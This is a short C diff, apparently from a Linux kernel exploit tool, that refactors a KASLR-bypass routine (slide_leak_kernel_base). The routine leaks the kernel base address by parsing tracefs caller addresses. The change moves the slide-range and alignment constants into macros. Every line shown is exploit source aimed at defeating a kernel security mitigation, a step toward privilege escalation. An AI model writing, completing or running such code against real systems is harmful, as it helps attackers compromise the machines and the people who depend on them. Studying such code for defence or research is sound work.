@@ -10,6 +10,14 @@
 #define SLIDE_BLOCK_THREADS 16
 #define SLIDE_MAX_DIAG_CALLERS 32
 
+#ifndef SLIDE_P0_ALIGNMENT
+#define SLIDE_P0_ALIGNMENT 0x10000ULL
+#endif
+#ifndef SLIDE_P0_MAX
+#define SLIDE_P0_MAX 0x1f0000ULL
+#endif
+#define SLIDE_P0_ALIGN_MASK (SLIDE_P0_ALIGNMENT - 1)
+
 static int slide_tracefs_write(const char *path, const char *value) {
   int fd = open(path, O_WRONLY | O_CLOEXEC);
   if (fd < 0) {
@@ -178,7 +186,7 @@ static int slide_tracefs_parse_page(
             KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
         if (caller >= link_caller) {
           uint64_t candidate = caller - link_caller;
-          if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+          if (candidate <= SLIDE_P0_MAX && (candidate & SLIDE_P0_ALIGN_MASK) == 0) {
             pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                        (unsigned long long)caller,
                        (unsigned long long)candidate);
@@ -397,8 +405,8 @@ int slide_leak_kernel_base(void) {
     char *end = NULL;
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
-    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
-        (value & 0xffffULL) != 0) {
+    if (errno || end == forced_offset_arg || *end || value > SLIDE_P0_MAX ||
+        (value & SLIDE_P0_ALIGN_MASK) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
